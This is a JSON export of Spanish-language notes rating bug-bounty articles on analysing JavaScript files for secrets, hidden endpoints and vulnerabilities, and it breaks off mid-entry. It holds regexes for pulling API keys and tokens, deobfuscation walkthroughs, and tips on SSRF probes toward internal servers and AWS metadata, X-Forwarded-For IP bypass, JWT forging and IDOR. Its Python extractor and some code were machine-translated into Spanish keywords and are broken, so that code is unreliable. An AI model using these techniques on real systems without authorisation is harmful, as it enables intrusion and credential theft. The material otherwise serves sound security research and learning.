{
  "id": "gj217kk",
  "title": "js",
  "items": [
    {
      "id": "86p0dav",
      "title": "informe",
      "payload": "https://osintteam.blog/part-2-advanced-js-extraction-analysis-automation-for-bug-bounty-recon-5535e5e04463",
      "note": "Nada interesante solo  esto: \n\n\n un script de Python que escanea los archivos JS descargados y los extrae:\n\nimportar re \nimportar sistema operativo \n\n# Patrones de expresiones regulares\n puntos finales = re. compilar ( r'[\"\\'](\\/[a-zA-Z0-9_\\-\\/\\.?=&]+)[\"\\']' ) \napi_keys = re. compilar ( r'(?i)(api[_-]?key|secret|token)[\"\\']?\\s*[:=]\\s*[\"\\']([A-Za-z0-9_\\-]{16,})[\"\\']' ) \nurls = re. compilar ( r'https?:\\/\\/[^\\s\"\\']+' ) \n\ndirectorio = \"downloaded_js\" \n\npara nombre_de_archivo en os.listdir(directorio): \n    ruta = os.path.join(directorio, nombre_de_archivo) \n    con  abierto (ruta, 'r' , codificaci√≥n= 'utf-8' , errores= 'ignorar' ) como f: \n        contenido = f.read() \n        imprimir ( f\"\\n--- {nombre_de_archivo} ---\" ) \n        imprimir ( \"üîó Puntos finales:\" ) \n        para  coincidencia  en puntos_de_archivo.findall(contenido): \n            imprimir ( f\"   { coincidencia } \" ) \n        imprimir ( \"üîê Claves: \" ) \n        para  coincidencia  en api_keys.findall(contenido): \n            imprimir ( f\"   { coincidencia } \" ) \n        imprimir ( \"üåê URL:\" ) \n        para  coincidencia  en urls.findall(contenido): \n            imprimir ( f\"   { coincidencia } \" )",
      "editedTs": 1761483313026,
      "status": "regular"
    },
    {
      "id": "l2hv997",
      "title": "informe",
      "payload": "https://medium.com/disruptive-labs/static-analysis-of-client-side-javascript-for-pen-testers-and-bug-bounty-hunters-f1cb1a5d5288",
      "note": "La minimizaci√≥n se refiere al proceso de eliminar datos innecesarios o redundantes sin afectar la forma en que el navegador procesa el recurso (por ejemplo, comentarios y formato de c√≥digo, eliminaci√≥n de c√≥digo no utilizado, uso de nombres de variables y funciones m√°s cortos, etc.).\n\nLa ofuscaci√≥n implica realizar modificaciones en el programa, cambiando los nombres de las variables, funciones y miembros, lo que hace que el programa sea mucho m√°s dif√≠cil de entender.\n\nExisten varias herramientas que permiten minimizar JavaScript. UglifyJS es una herramienta √∫til para minimizar c√≥digo JS y tambi√©n est√° disponible como paquete npm.\nPresione enter o haga clic para ver la imagen en tama√±o completo\n\n\n\nExisten varias herramientas que permiten desminificar JavaScript. JS Beautifier permite embellecer y desofuscar ciertos esquemas de ofuscaci√≥n. Puedes usar esta herramienta a trav√©s de Node.js , Python , en l√≠nea o en un editor de c√≥digo como VS Code .\nPresione enter o haga clic para ver la imagen en tama√±o completo\n\n\nAl realizar la desofuscaci√≥n, especialmente al revertir malware, no existe una t√©cnica o herramienta universal. Deber√° probar diversas herramientas, esquemas de desofuscaci√≥n y realizar an√°lisis manuales. Existen diversas herramientas que pueden ayudarle a desofuscar c√≥digo JavaScript. Algunas de las herramientas que usamos con frecuencia son JStillery , JSDetox , JS-Beautifier , IlluminateJs , JSNice , etc.\n\n\nrelative-url-extractor de Jobert Abma es muy √∫til para identificar r√°pidamente todas las rutas relativas en un archivo JavaScript. Esta herramienta funciona tanto con archivos JavaScript locales como remotos. Tambi√©n funciona directamente con JavaScript minimizado.\nPresione enter o haga clic para ver la imagen en tama√±o completo\n\nLa b√∫squeda basada en entrop√≠a es eficaz para identificar secretos suficientemente aleatorios, como claves API y tokens.\n\nDumpsterDiver , Repo-supervisor y truffleHog son herramientas fant√°sticas para buscar secretos en archivos de c√≥digo fuente. La mayor√≠a de estas herramientas admiten b√∫squedas basadas en entrop√≠a y expresiones regulares. Adem√°s, son f√°ciles y altamente personalizables, tanto en la b√∫squeda de expresiones regulares como en la de entrop√≠a.\nPresione enter o haga clic para ver la imagen en tama√±o completo\n\nNo olvide que grep/sed/awk tambi√©n son bastante potentes a la hora de buscar informaci√≥n confidencial espec√≠fica en los archivos de c√≥digo fuente.\n\n El uso incorrecto de m√©todos en Angular tambi√©n puede provocar problemas de XSS. La funci√≥n es otro punto donde pueden surgir problemas tanto en el lado del cliente como en el del servidor.bypassSecurityTrustXeval\n\nLa API postMessage es una alternativa a JSONP, XHR con encabezados CORS y otros m√©todos que permiten el env√≠o de datos entre or√≠genes omitiendo la Pol√≠tica del Mismo Origen (SOP). La idea de evadir la SOP y comunicarse con diferentes or√≠genes deber√≠a ser de inter√©s para los atacantes. Existen varias vulnerabilidades de seguridad al usar postMessage. Una vez que comprenda los posibles problemas de seguridad asociados con postMessage, puede buscar la implementaci√≥n en archivos JavaScript. En el lado del remitente del mensaje, busque un listenerwindow.postMessagey, en el lado del receptor, un `listener`window.addEventListener. Tenga en cuenta que muchos frameworks implementan `wrappers` en torno a postMessage.\nlocalStorage y sessionStorage son objetos de almacenamiento web HTML. Con el almacenamiento web, las aplicaciones web pueden almacenar datos localmente en el navegador del usuario. Es importante identificar qu√© se almacena mediante el almacenamiento web, especialmente almacenar informaci√≥n confidencial, ya que puede generar posibles problemas de seguridad. En JavaScript, se pueden buscar window.localStoragey window.sessionStorage.\n\n. ESLint es uno de los linters de JavaScript m√°s populares. ESLint se puede personalizar f√°cilmente a√±adiendo reglas personalizadas. Hay muchas reglas de seguridad personalizadas disponibles para ESLint, especialmente dise√±adas para frameworks modernos como Angular, React, etc.",
      "editedTs": 1761483940146,
      "status": "muybueno"
    },
    {
      "id": "ee2be5a",
      "title": "informe",
      "payload": "https://medium.com/@ali_saadi/zero-click-account-takeover-the-power-of-javascript-analysis-4f1d4fc36a00",
      "note": "Interesante la parte de como bypass el login cierta parte solamente comprendiendo el bloque de codigo de restablecimiento de contrase√±a:",
      "editedTs": 1761484260851,
      "status": "regular"
    },
    {
      "id": "r1m738t",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@omarzzu/from-javascript-analysis-to-uuid-pattern-exploration-revealed-a-critical-idor-5c526451e7ec",
      "note": "Un consejo r√°pido: Al abrir un sitio y consultar las Herramientas de Desarrollo, ver√°s los archivos JavaScript cargados por tu navegador. Sin embargo, esta no es la imagen completa. Algunos archivos podr√≠an estar ocultos o cargarse din√°micamente, como los de las funciones de administraci√≥n.\n\nEntonces not√© un patr√≥n en los nombres de los archivos, como users.js, customer.js y static.js. Esto me dio una idea: ¬øqu√© tal si intento manipular los nombres de los archivos JavaScript?\n\n\"\"\nIntersante fuzzin con diccionario personalizado encontro archivo reports.js \n\"\"\n\nencontr√© un punto final en el lado del cliente que me permit√≠a modificar (mis propios) documentos gubernamentales mediante una solicitud de API\n\nNo limite su an√°lisis a los archivos JavaScript accesibles: busque tambi√©n los ocultos.\nNunca conf√≠es en los UUID: ¬°pueden ser enga√±osos!",
      "editedTs": 1761484522597,
      "status": "buen"
    },
    {
      "id": "583r5q2",
      "title": "Nuevo informe",
      "payload": "https://melguerdawi.medium.com/javascript-analysis-to-sql-injection-ca763f9c4c4e",
      "note": "Analizando js encontro un parametro nuevo no listado y probe sql inyeccion\ncomillas simple y response encontre el error sql y con la tool de sqlmap logro sacarlo.",
      "editedTs": 1761484647302,
      "status": "regular"
    },
    {
      "id": "75w8mhi",
      "title": "Nuevo informe",
      "payload": "https://rikeshbaniya.medium.com/javascript-analysis-leading-to-admin-portal-access-ea30f8328c8e",
      "note": "Encontre varios puntos finales donde logro cambiar su token jwt y lograr ingresar a recursos interesantes.",
      "editedTs": 1761484759271,
      "status": "regular"
    },
    {
      "id": "e379hcd",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/javascript-leads-to-admin-f7afecc21d02",
      "note": "Interesante logro encontrar jwt luego de unir 2 directorio en uno  y hacer fuzzin resultado duplicado interno.",
      "editedTs": 1761485017260,
      "status": "luego"
    },
    {
      "id": "kfy9x1r",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/uncover-hidden-endpoints-secrets-and-vulnerabilities-buried-inside-javascript-files-ea965b43f969",
      "note": "Direcciones de correo electr√≥nico:[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\.[a-zA-Z]{2,}",
      "editedTs": 1761485087852,
      "status": "monton"
    },
    {
      "id": "nv4li99",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/legionhunters/information-disclosure-vulnerability-writeup-hackerone-be7fbe7e7893",
      "note": "pues encontro analizando 10 .js de hackeroner autenticado haciendo fuzzin a un directorio encontro php-info severidad media.",
      "editedTs": 1761485483054,
      "status": "buen"
    },
    {
      "id": "ui9e3t4",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@gheeX/exposing-open-redirect-vulnerabilities-javascript-file-analysis-in-http-history-burp-suite-c64bd1c93c54",
      "note": "encontro un parametro lo probo con open redirect funciono estado duplicado no logro ejecutar xss.",
      "editedTs": 1761485610330,
      "status": "muybueno"
    },
    {
      "id": "pvt36y7",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://lopseg.medium.com/navigating-tree-sitter-queries-with-jsluice-for-javascript-file-analysis-061b7cb4ea9d",
      "note": "Tree-Sitter para crear consultas efectivas con jsluice . Esta gu√≠a mejorar√° su capacidad para analizar archivos JavaScript con precisi√≥n.\n\nAl dominar las consultas de Tree-Sitter, desbloquear√°s un nuevo nivel de precisi√≥n en el an√°lisis de c√≥digo JavaScript, mejorando tu capacidad para identificar patrones, vulnerabilidades y m√°s. üåü\n\n\n\nA continuaci√≥n se muestran 10 ejemplos pr√°cticos de consultas para ' jsluice ' para extraer datos interesantes de archivos JavaScript:\n\n1. Extraiga todos los nombres de funciones\n\nconsulta jsluice -q \"(nombre de declaraci√≥n de funci√≥n: (identificador) @nombre_de_funci√≥n)\" su_archivo.js\n\n2. Encuentra todas las variables declaradas\n\nconsulta jsluice -q \"(declarador_de_variable id: (identificador) @variable)\" su_archivo.js\n\n3. Identifica todas las cadenas utilizadas\n\nconsulta jsluice -q \"(cadena) @string_value\" su_archivo.js\n\n4. Localice todas las llamadas API\n\nconsulta jsluice -q \"(funci√≥n call_expression: (member_expression) @api_call)\" your_file.js\n\n5. Detectar el uso de 'eval'\n\nconsulta jsluice -q \"(funci√≥n call_expression: (nombre del identificador: 'eval'))\" your_file.js\n\n6. Encuentra todas las asignaciones a 'window.location'\n\nconsulta jsluice -q \"(expresi√≥n_asignaci√≥n izquierda: (expresi√≥n_miembro objeto: (nombre_identificador: 'ventana') propiedad: (nombre_identificador_propiedad: 'ubicaci√≥n')))\" your_file.js\n\n7. Extraer todos los detectores de eventos\n\nconsulta jsluice -q \"(funci√≥n call_expression: (propiedad member_expression: (nombre property_identifier: 'addEventListener'))) @event_listener\" your_file.js\n\n8. Encuentra el uso de localStorage\n\nconsulta jsluice -q \"(objeto member_expression: (nombre del identificador: 'localStorage'))\" your_file.js\n\n9. Descubra todas las XMLHttpRequests\n\njsluice query -q \"(nueva_expresi√≥n llamada: (nombre del identificador: 'XMLHttpRequest'))\" your_file.js\n\n10. Identificar todos los scripts en l√≠nea en un archivo HTML\n\nconsulta jsluice -q \"(elemento_de_script)\" su_archivo.html\n\nCada una de estas consultas apunta a un aspecto espec√≠fico del c√≥digo JavaScript que podr√≠a revelar informaci√≥n valiosa durante el an√°lisis, como identificar posibles vulnerabilidades o comprender la estructura del c√≥digo.",
      "editedTs": 1761485814412,
      "status": "regular"
    },
    {
      "id": "349z0eo",
      "title": "Nuevo informe",
      "payload": "https://medium.com/greenwolf-security/linting-for-bugs-vulnerabilities-49bc75a61c6",
      "note": "lo unico interesante es el linter de js te ense√±a como descargarlo configurarlo y tambien los 2 opcion intesivo ligero primero comienza con ligero y luego el otro pero resulta falso positivo f de igual manera interesante igual para mi no probo todo tanto estatico como dinamico y ademas no desofuzco lo suficiente y tampoco aplico reglas regex o palabras claves en la busqueda entres otros.",
      "editedTs": 1761486197926,
      "status": "buen"
    },
    {
      "id": "jc92rg7",
      "title": "Nuevo informe",
      "payload": "https://hacktivistattacker.medium.com/javascript-hunting-and-analyzing-for-bug-bounty-a15416de32cd",
      "note": "pos no mucho solo algunos recursos y eso.",
      "editedTs": 1761486546122,
      "status": "regular"
    },
    {
      "id": "pi0k061",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@jad2121/javascript-deobfuscation-the-easy-way-637d7e9b2952",
      "note": "√öltimamente, me he estado volviendo loco con el JavaScript ofuscado. Hace que el an√°lisis est√°tico sea casi imposible, y el din√°mico, casi imposible. El proceso de desofuscaci√≥n puede ser largo y arduo. Me propuse hacerlo un poco m√°s f√°cil.\n\nmatrix y una funcion que manipule eso en link informe foto de referencia de como se ve generalmente interesante.\n\n\n\nconst G = [ \n    \"Firefox\" , \n    \"modificado\" , \n    \"continuar\" , \n    \"antes de descargar\" , \n    \"idioma del usuario\" , \n    \"clave temporal\" , \n    \"controlador de captura de pantalla\" , \n    \"isHDR\" , \n    \"hermano anterior\" , \n    \"evento de teclado \" , \n    \"teclas num√©ricas\" , \n    \"lyy7U\" , \n    \"isSardineStringEntry\" , \n    \"RTCEncodedAudioFrame\" , \n    \"script[src*=extensi√≥n]\" , \n    \"atanh\" , \n    ... \n    \"dev\" ...\nTambi√©n suele haber una funci√≥n que manipula esta matriz de alguna manera. La funci√≥n suele tener este aspecto:\n\nfunci√≥n  a3q ( u, R ) { \n  const G = a3b (); \n  return ( \n    (a3q = funci√≥n ( b, q ) { \n      b = b - 0x77 ; \n      sea K = G[b]; \n      return K; \n    }), \n    a3q (u, R) \n  ); \n} \n( function ( u, R ) { \n  const uZ = a3q, \n    G = u (); \n  while (!![]) { \n    intentar { \n      const b = \n        parseInt ( uZ ( 0xdf )) / 0x1 + \n        (- parseInt ( uZ ( 0x2e5 )) / 0x2 ) * (- parseInt ( uZ ( 0x273 )) / 0x3 ) + \n        - parseInt ( uZ ( 0x221 )) / 0x4 + \n        (- parseInt ( uZ ( 0x86 )) / 0x5 ) * (- parseInt ( uZ ( 0x18f )) / 0x6 ) + \n        - parseInt ( uZ ( 0x242 )) / 0x7 + \n        parseInt ( uZ ( 0xa0 )) / 0x8 + \n        (- parseInt ( uZ ( 0x1df )) / 0x9 ) * ( parseInt ( uZ ( 0x227 )) / 0xa ); \n      si (b === R) break ; \n      de lo contrario G[ ‚Äã‚Äã\"empujar\" ](G[ \"desplazar\" ]()); \n    } catch (q) { \n      G[ \"empujar\" ](G[ \"desplazar\" ]()); \n    } \n  } \n})(a3b, 0xa6ef0 ),\n \nLo que esto hace es desplazar inicialmente (mover el primer valor al final)\n\nG [ \"empujar\" ] (G [ \"cambiar\" ] ()",
      "editedTs": 1761486673791,
      "status": "muybueno"
    },
    {
      "id": "drtwkc3",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@loyalonlytoday/find-secrets-in-js-files-bug-bounty-587e29025682",
      "note": "nada.",
      "editedTs": 1761486722204,
      "status": "monton"
    },
    {
      "id": "ac2nldy",
      "title": "Nuevo informe",
      "payload": "https://keroayman77.medium.com/exposed-api-keys-config-files-in-js-file-bug-bounty-790b02a015ff",
      "note": "nada",
      "editedTs": 1761486771744,
      "status": "monton"
    },
    {
      "id": "tok4xuf",
      "title": "Nuevo informe",
      "payload": "https://kathanp19.medium.com/beginners-guide-on-how-you-can-use-javascript-in-bugbounty-492f6eb1f9ea",
      "note": "nada",
      "editedTs": 1761486870854,
      "status": "monton"
    },
    {
      "id": "1lbaag5",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/javascript-enumeration-for-bug-bounties-expose-hidden-endpoints-secrets-like-a-pro-418c2aec318f",
      "note": "nada",
      "editedTs": 1761486958468,
      "status": "monton"
    },
    {
      "id": "1bizu3c",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/ever-found-a-valid-bug-leaks-in-javascript-files-in-bug-bounties-81ba362612a7",
      "note": "√öselo (\\$\\.ajax\\(\\s*url:\\s*['\"])(\\/api\\/[^'\"]+)para encontrar puntos finales AJAX.\n\ntener en cuenta que esto regla ajax solo se aplicaria a los archivos js dinamicos ya que los estaticos no hacen la llamada por arte de magia ok entonces recolectar js dinamicos interactuando con el sitio web funiones etc con proxy activado capturando todo ok.\n\nConsejo profesional : Busca tokens temporales con una vida √∫til corta (p. ej., tempToken). Suelen tener una validez de 5 a 15 minutos.\n\nmuy bueno eso.\n\n\n\nIgnorar scripts de terceros\nError : Solo se audita el c√≥digo JavaScript propio, sin detectar fugas en bibliotecas de terceros. Por qu√© falla : Las bibliotecas analytics.jssuelen chatwidget.jscodificar claves espec√≠ficas del entorno.\n\nT√©cnica avanzada: auditor√≠a de scripts de terceros\nIdentificar scripts de terceros:\n\ngospider -s https://target.com --js | grep 'external-domain.com'\n\n2. Comprobar anulaciones:\n\n\n// Look for domain-specific configs in third-party scripts:\nanalytics.init({ projectId: 'target_prod_123' });\n\n\nConsejo profesional : utilice Burp's Collaborator en scripts de terceros para detectar vulnerabilidades SSRF/DSN.\n\nmuy bueno esto que viene:\n\nPatrones sutiles faltantes y par√°metros de depuraci√≥n\nError : no buscar indicadores de depuraci√≥n ni probar par√°metros como ?debug=1.\n\nT√©cnica avanzada: an√°lisis de par√°metros de depuraci√≥n\nAgregar par√°metros a las URL JS/CSS:\n\nejemplo:\ncurl https://target.com/app.js?debug=true  \n\n2. Busque funciones de depuraci√≥n en el c√≥digo:\n\nif (debugMode) console.log('Admin token:', token);\n\nConsejo profesional : utilice la funci√≥n Anular de Chrome para forzar debugMode = truey desbloquear interfaces de usuario ocultas.\n\nNo correlacionarse con otras vulnerabilidades\nError : tratar los hallazgos de JS de forma aislada.\n\nT√©cnica avanzada: encadenamiento de fugas de JS con IDOR/SSRF\nEncontrar un punto final en JS:\n\nfetch('/api/users/${id}/delete')\n2. Pruebe IDOR intercambiando idvalores.\n\n3. Compruebe si el punto final acepta URL (SSRF):\n\n\nPOST /api/users/123/delete { \"url\": \"http://internal-server\" }\nEjemplo del mundo real : un punto final expuesto a JS /api/fetch?url=condujo a SSRF a metadatos de AWS.\n\nHoja de trucos de banderas\ngrep:-Ero ‚Üí B√∫squeda de expresiones regulares en archivos\n\ngospider:--subs , --js‚Üí Incluir subdominios, extraer enlaces JS\n\ncurl:-H \"X-Forwarded-For: 127.0.0.1\" ‚Üí Evitar restricciones de IP\n\nPuppeteer:--no-sandbox ‚Üí Evitar la zona protegida de Chrome en Docker",
      "editedTs": 1761487476838,
      "status": "excelente"
    },
    {
      "id": "p9s2sfm",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@logicTech/javascript-tools-for-bugbounty-2024-fc281111c7c0",
      "note": "varias tools para analisis de .js interesante pero basico.",
      "editedTs": 1761487540421,
      "status": "regular"
    },
    {
      "id": "wjjd55x",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@DrSecurityGuru/js-enumeration-tools-for-bug-bounty-hunting-identifying-vulnerabilities-and-gaining-website-40419a2b5af7",
      "note": "pyjsparser: Analizador r√°pido de JavaScript: traducci√≥n manual de esprima.js a Python. Tarda 1 segundo en analizar toda la biblioteca de Angular.js, por lo que la velocidad de an√°lisis es de aproximadamente 100 000 caracteres por segundo, lo que lo convierte en el analizador de JavaScript para Python m√°s r√°pido y comprensible del mercado.\n\n10. Desofuscador de JavaScript: Desofuscador de JavaScript es una herramienta que permite desofuscar c√≥digo JavaScript. Un desofuscador simple pero potente que elimina t√©cnicas comunes de ofuscaci√≥n de JavaScript.\n\nSe puede acceder desde el sitio web https://deobfuscate.io/\n\nConsejos para la b√∫squeda de recompensas por errores de enumeraci√≥n de JS\nComience analizando el c√≥digo fuente del sitio web para identificar cualquier archivo JavaScript potencial que pueda estar presente.\nUtilice herramientas como JSParser o JSScan para automatizar el proceso de identificaci√≥n y an√°lisis de archivos JavaScript.\nBusque cualquier informaci√≥n confidencial que pueda estar presente en los archivos JavaScript, como credenciales o claves codificadas.\nVerifique si hay vulnerabilidades conocidas en las bibliotecas y marcos de JavaScript que se utilizan en el sitio web.\nUtilice las herramientas de desarrollo del navegador para analizar el c√≥digo JavaScript y comprender la funcionalidad del sitio web.\nPruebe vulnerabilidades del lado del cliente, como secuencias de comandos entre sitios (XSS) y falsificaci√≥n de solicitudes entre sitios (CSRF).\nPreste atenci√≥n a cualquier solicitud de red realizada por el c√≥digo JavaScript, ya que puede revelar informaci√≥n adicional sobre el sitio web.\nUtilice una herramienta proxy como Burp Suite para interceptar y analizar solicitudes y respuestas de JavaScript.\nCompruebe si hay scripts de terceros que puedan estar cargados en el sitio web, ya que pueden introducir riesgos de seguridad adicionales.",
      "editedTs": 1761487713934,
      "status": "buen"
    },
    {
      "id": "tva5o5n",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@ibtissamhammadi1/how-to-find-js-files-for-vulnerabilities-a-bug-bounty-hunters-guide-3ecf207b4845",
      "note": "nada interesante.",
      "editedTs": 1761487839297,
      "status": "monton"
    },
    {
      "id": "y338mfx",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@sharp488/passively-found-secrets-in-javascript-file-on-a-private-bug-bounty-program-36eb29c2a35c",
      "note": "Utilic√© una extensi√≥n de Burp Suite llamada jsluice++ que est√° disponible en Github.",
      "editedTs": 1761487930792,
      "status": "regular"
    },
    {
      "id": "42ros6b",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@devanshpatel930/how-did-i-hack-a-website-just-by-reading-js-files-6d6a6a90aac1",
      "note": "intersante websocket entontro un token pero expirado ya de igual manera bounty. Ya que estaba expuesto.",
      "editedTs": 1761488188700,
      "status": "buen"
    },
    {
      "id": "lxjizkv",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/11-secrets-in-js-files-and-how-to-find-them-f4088cf71610",
      "note": "crear regla regex para ip.\n\nBajo ($$) ‚Äî ~$100-$500\nHallazgo: Direcci√≥n IP interna, punto final no sensible, versi√≥n de biblioteca desactualizada (sin explotaci√≥n comprobada).\nEjemplo: El hallazgo const INTERNAL_IP = '192.168.1.55';suele ser meramente informativo, a menos que pueda vincularse con otra vulnerabilidad.\n\nMediano ($$$) ‚Äî ~$500-$1,500\nHallazgo: Una clave API v√°lida para un servicio de terceros con permisos reducidos (por ejemplo, una API de an√°lisis de solo lectura o una API de mapas p√∫blicos). Se requiere comprobante de recuperaci√≥n de datos.\nEjemplo: Encontrar una clave API de Google Maps. Aunque suele estar restringida por el referente, se producen errores de configuraci√≥n. Si se puede usar para generar facturas en su cuenta, el impacto es muy alto.\n\nAlto ($$$$) ‚Äî ~$1,500-$5,000\nHallazgo: un punto final sensible que revela informaci√≥n de identificaci√≥n personal (PII), una clave API de acceso de escritura para un servicio no cr√≠tico o credenciales codificadas para un entorno de prueba.\nEjemplo: Encontrar un punto final de API no documentado: https://api.target.com/v1/admin/users. O encontrar una clave de API de SendGrid que permita enviar correos electr√≥nicos desde su dominio.\n\nCr√≠tico ($$$$$) ‚Äî $5,000+\nHallazgo: una clave API maestra, credenciales de AWS, una cadena de conexi√≥n de base de datos o un token de acceso privado de GitHub.\nEjemplo 1: B√∫squeda AWS_SECRET_ACCESS_KEYen un archivo. Esto puede provocar la apropiaci√≥n total de la cuenta en la nube, el acceso al bucket de S3 o incluso la generaci√≥n de instancias EC2 sin su propio dinero.\n\nEjemplo 2: Encontrar un token de GitHub con repoalcance. Esto podr√≠a permitirle clonar sus repositorios privados de c√≥digo fuente, lo que provocar√≠a una vulneraci√≥n masiva de la propiedad intelectual.\n\n La trampa del JWT\nEncuentras un JWT (JSON Web Token) en un archivo JS. Probablemente est√© caducado. No te detengas.\n\nPru√©belo. Copie el token y pru√©belo en diferentes endpoints , especialmente en los administrativos ( /admin, /api/admin). A veces, los desarrolladores codifican tokens temporales para la configuraci√≥n inicial que nunca se desactivan.\nComprueba la firma. Si la aplicaci√≥n usa un secreto d√©bil (o ninguno) para firmar los JWT, podr√≠as falsificar tus propios tokens. El secreto usado para firmar podr√≠a estar en otra parte del c√≥digo.",
      "editedTs": 1761488554423,
      "status": "buen"
    },
    {
      "id": "dsvm2vl",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/unearthing-digital-gold-a-practical-guide-to-finding-bugs-in-javascript-files-1e6338c73899",
      "note": "interesante descargar js primero luego embellecer lo minificado, luego desofuscar .\n\n\n: Descargar y embellecer Primero, haga que el c√≥digo sea legible.\n\nCopiar\n# Download a file of interest\nwget https://target.com/static/crypto.min.js -O crypto.js\n\n# Beautify it using js-beautify (install with `npm -g js-beautify`)\njs-beautify crypto.js -o crypto-beautified.js\nPaso 2: Desofuscar con JSNice. Si el c√≥digo sigue siendo cr√≠ptico, JSNice puede hacer maravillas renombrando variables y funciones a algo inteligible. Aunque tiene una interfaz web, suelo usar la API directamente:\n\nCopiar\ncurl -s -X POST --data-binary \"@crypto-beautified.js\" \"https://www.jsnice.org/beautify?pretty=1&rename=1\" -o crypto-deobfuscated.js\nUn ejemplo real: la falla de la billetera criptogr√°fica\n\nEn un programa privado de recompensas por errores, encontr√© un archivo llamado walletLogic.min.js. Tras embellecerlo y desofuscarlo, encontr√© una funci√≥n como esta:\n\nCopiar\nfunction validateWalletAccess(userId, walletId, authToken) {\n    // ... validation logic ...\n    if (userHasAccess) {\n        return makeApiCall('/api/wallet/' + walletId + '/contents', authToken);\n    }\n}\nLa funci√≥n userHasAccessera compleja, pero not√© makeApiCallque constru√≠a la URL simplemente concatenando el walletId. Me pregunt√©: \"¬øQu√© pasa si cambio walletIdel ID de billetera de otro usuario despu√©s de que el m√≠o authTokenya est√© validado?\".\n\nIntercept√© una solicitud leg√≠tima a mi billetera ( walletId=12345), cambi√© el ID a 67890y la reenvi√©. El servidor devolvi√≥ la informaci√≥n financiera completa de otro usuario. Se trataba de una vulnerabilidad cl√°sica de Referencia Directa a Objetos Insegura (IDOR), ya que la comprobaci√≥n del lado del cliente era in√∫til sin la correspondiente del lado del servidor. Este hallazgo cr√≠tico solo era visible al comprender la l√≥gica del c√≥digo.\n\nQu√© buscar durante la revisi√≥n manual\neval(), setTimeout()con entrada del usuario: conduce a la ejecuci√≥n remota de c√≥digo (RCE) si la entrada no est√° desinfectada.\nOyentes de PostMessage: una validaci√≥n incorrecta de originpuede provocar secuencias de comandos entre sitios (XSS) o robo de datos.\nCredenciales codificadas: especialmente para servicios de terceros como S3, SendGrid o Firebase.\nFunciones criptogr√°ficas personalizadas: crear su propio cifrado es una gran se√±al de alerta.\nPar√°metros de depuraci√≥n: Me gusta isAdmin=trueo debugMode=enableeso podr√≠a haberse dejado.",
      "editedTs": 1761489045221,
      "status": "muybueno"
    },
    {
      "id": "4u4uwqx",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@iski/key-to-the-kingdom-how-i-found-api-secrets-hiding-in-plain-sight-in-javascript-files-2f92ab1dfe63",
      "note": "maso o menos esta bueno como se expresa le dio un puntito extra.",
      "editedTs": 1761489214269,
      "status": "buen"
    },
    {
      "id": "l2jcjj7",
      "title": "Nuevo informe",
      "payload": "https://medium.com/@zoningxtr/how-i-discovered-hidden-json-graphql-requests-and-won-a-10-000-bug-bounty-dc0d72b4aba4",
      "note": "Por qu√© son importantes las solicitudes ocultas\nA las aplicaciones modernas no les gusta exponer datos en cadenas de consulta.\nEn lugar de eso, lo empujan todo hacia:\nCuerpos JSON POST ‚Üí API REST cl√°sicas.\nCuerpos POST de GraphQL ‚Üí API modernas basadas en consultas.\nEstos son invisibles en las URL, lo que hace que sea m√°s dif√≠cil detectarlos... a menos que sepas d√≥nde buscar.\nComo cazador de errores, su misi√≥n es simple: encontrar d√≥nde la entrada del usuario se cuela en estos cuerpos y ver c√≥mo el sistema la refleja o la ejecuta.\n\nFlujo de trabajo del cazador de errores\nConfigurar Burp Proxy y limitar el alcance de todas las solicitudes.\nMire m√°s all√° de la URL: revise el cuerpo del POST .\nPara las API JSON : busque entradas de clave/valor como \"query\", \"name\", \"comment\".\nPara las API de GraphQL : busque query { ‚Ä¶ }estructuras o \"variables\": { ... }.\nInyecta marcadores (por ejemplo, XSS_TEST_123) para ver d√≥nde se refleja.\nReemplazar con cargas √∫tiles ‚Üí confirmar ejecuci√≥n.\nüèÜ La ventaja del cazador de insectos\nLos esc√°neres suelen ignorar los cuerpos JSON y GraphQL. Esto significa:\n\nMenos ruido.\nM√°s posibilidades tendr√°s de ser el primero en encontrarlo.\nPagos mayores.\nConsejo profesional: muchas recompensas de m√°s de $10,000 provienen de cazadores que detectaron una consulta GraphQL oculta o una entrada JSON que otros pasaron por alto.",
      "editedTs": 1761489385200,
      "status": "buen"
    },
    {
      "id": "cusxcml",
      "title": "Nuevo informe",
      "payload": "xtr/bug-bounty-goldmine-hidden-inputs-in-ajax-json-graphql-where-hunters-strike-gold-cb2936addf57",
